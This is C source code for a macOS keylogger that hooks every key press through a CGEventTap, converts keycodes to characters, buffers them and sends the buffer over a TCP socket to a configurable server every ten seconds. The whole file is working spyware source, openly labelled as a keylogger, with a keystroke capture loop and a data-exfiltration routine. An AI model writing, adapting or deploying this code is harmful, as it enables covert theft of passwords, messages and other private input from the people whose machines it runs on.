#include "keyloggermac.h"
//keylogger for mac
char* keyCodeToString(CGKeyCode keyCode) {
    static char result[64];  // Store result as a C string

    TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
    CFDataRef uchr = (CFDataRef)TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
    const UCKeyboardLayout *keyboardLayout = (const UCKeyboardLayout*)CFDataGetBytePtr(uchr);

    if (keyboardLayout) {
        UInt32 deadKeyState = 0;
        UniCharCount maxStringLength = 4;
        UniCharCount actualStringLength = 0;
        UniChar unicodeString[maxStringLength];

        OSStatus status = UCKeyTranslate(keyboardLayout, keyCode, kUCKeyActionDown, 0, LMGetKbdType(), 0, &deadKeyState, maxStringLength, &actualStringLength, unicodeString);

        if (actualStringLength > 0 && status == noErr) {
            CFStringRef tempString = CFStringCreateWithCharacters(NULL, unicodeString, (CFIndex)actualStringLength);
            CFStringGetCString(tempString, result, sizeof(result), kCFStringEncodingUTF8);
            CFRelease(tempString);
            return result;
        }
    }

    return NULL;
}

// Function to send the keystrokes to the server
void send_keystrokes_to_server() {
    int client_socket;
    struct sockaddr_in server_address;
    char *server_ip = "127.0.0.1";  // Adjust if necessary
    int server_port = 12345;

    // Create a socket
    client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket < 0) {
        printf("Socket creation failed.\n");
        return;
    }

    // Set server address
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(server_port);
    inet_pton(AF_INET, server_ip, &server_address.sin_addr);

    // Connect to the server
    if (connect(client_socket, (struct sockaddr *)&server_address, sizeof(server_address)) < 0) {
        printf("Connection to server failed.\n");
        close(client_socket);
        return;
    }

    // Send the keystrokes
    send(client_socket, keystroke_buffer, strlen(keystroke_buffer), 0);
    //printf("Keystrokes sent: %s\n", keystroke_buffer);

    // Clear the buffer
    memset(keystroke_buffer, 0, sizeof(keystroke_buffer));
    buffer_pos = 0;  // Reset buffer position

    // Close the connection
    close(client_socket);
}

// Keylogger callback
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if (type == kCGEventKeyDown) {
        // Capture keycode
        int keycode = (int)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
        
        // Convert keycode to string
        char *key_str = keyCodeToString(keycode);
        
        // Append key_str to buffer (if valid)
        if (key_str != NULL) {
            buffer_pos += snprintf(keystroke_buffer + buffer_pos, sizeof(keystroke_buffer) - buffer_pos, "%s ", key_str);
        }
    }
    return event;
}

int main() {
    // Create event tap
    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
    CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, eventCallback, NULL);

    if (!eventTap) {
        printf("Event Tap Creation Failed.\n");
        exit(1);
    }

    // Add event tap to run loop
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);

    // Run keylogger and send data every 10 seconds
    while (1) {
        CFRunLoopRunInMode(kCFRunLoopDefaultMode, 10, false);  // Run for 10 seconds

        if (buffer_pos > 0) {
            send_keystrokes_to_server();  // Send data to the server every 10 seconds
        }
    }

    return 0;
}
